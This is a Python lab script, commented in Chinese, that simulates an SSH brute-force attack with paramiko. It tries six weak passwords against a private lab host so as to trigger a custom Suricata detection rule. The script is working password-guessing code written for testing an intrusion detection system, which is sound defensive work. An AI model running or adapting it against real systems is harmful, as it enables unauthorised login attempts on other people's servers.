"""
实验二：SSH 暴力破解模拟实验
用途：触发 Suricata 自定义 SSH brute-force 规则
"""

import paramiko
import time
from datetime import datetime

TARGET_HOST = "192.168.99.10"    # SSH 服务器 IP（管理区推荐）
TARGET_PORT = 22
USERNAME = "testuser"

# 模拟常见弱口令
PASSWORD_LIST = [
    "123456",
    "admin",
    "password",
    "root",
    "test123",
    "qwerty"
]

DELAY = 5    # 每次尝试之间的延迟（与规则 seconds 参数匹配）

def ssh_login_attempt(host, port, username, password):
    """
    执行一次 SSH 登录尝试
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=3,
            allow_agent=False,
            look_for_keys=False
        )
        print(f"[+] Login success with password: {password}")
    except paramiko.AuthenticationException:
        print(f"[-] Login failed with password: {password}")
    except Exception as e:
        print(f"[!] Connection error: {e}")
    finally:
        client.close()

def main():
    print("=" * 60)
    print(" Python SSH 暴力破解模拟实验")
    print(f" Target Host : {TARGET_HOST}")
    print(f" Username    : {USERNAME}")
    print(f" Start Time  : {datetime.now()}")
    print("=" * 60)

    for pwd in PASSWORD_LIST:
        ssh_login_attempt(
            TARGET_HOST,
            TARGET_PORT,
            USERNAME,
            pwd
        )
        time.sleep(DELAY)

    print("=" * 60)
    print(" SSH 暴力破解模拟结束")
    print(f" End Time    : {datetime.now()}")
    print("=" * 60)

if __name__ == "__main__":
    main()
